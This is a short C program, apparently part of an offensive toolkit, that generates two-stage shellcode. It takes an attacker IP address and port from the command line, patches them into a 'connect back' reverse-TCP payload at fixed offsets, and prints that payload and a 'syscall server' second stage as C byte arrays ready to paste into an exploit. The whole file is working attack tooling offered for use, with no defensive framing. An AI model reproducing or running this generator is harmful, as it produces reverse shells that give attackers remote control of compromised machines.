#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>

#define SC_SIZE(sc_label) ((unsigned long)sc_label##_end - (unsigned long)sc_label)
#define IP_OFF 17
#define PORT_OFF 23

extern void reverse_tcp(void);
extern void reverse_tcp_end(void);
extern void syscall_server(void);
extern void syscall_server_end(void);

void dump_shellcode(const char *name, const char *shellcode, size_t size)
{
	int i;
	printf("char %s[] =\n", name);
	while (size) {
		printf("\"");
		for (i = 0; i < 8 && size; i++, size--)
			printf("\\x%.2hhx", (unsigned int)*shellcode++);
		printf("\"");
		if (!size)
			printf(";");
		printf("\n");
	}
}

int main(int argc, char **argv)
{
	char reverse_tcp_sc[SC_SIZE(&reverse_tcp)];

	if (argc < 3) {
		printf("Usage : %s ip port\n", argv[0]);
		exit(1);
	}

	memcpy(reverse_tcp_sc, &reverse_tcp, SC_SIZE(&reverse_tcp));
	*(unsigned long *)(reverse_tcp_sc + IP_OFF) = inet_addr(argv[1]);
	*(unsigned short *)(reverse_tcp_sc + PORT_OFF) = htons(atoi(argv[2]));

	printf("/*\n * connect back shellcode\n */\n");
	dump_shellcode("stage1", (char *)reverse_tcp_sc, SC_SIZE(&reverse_tcp));

	printf("\n/*\n * syscall server shellcode\n */\n");
	dump_shellcode("stage2", (char *)&syscall_server, SC_SIZE(&syscall_server));

	return 0;
}
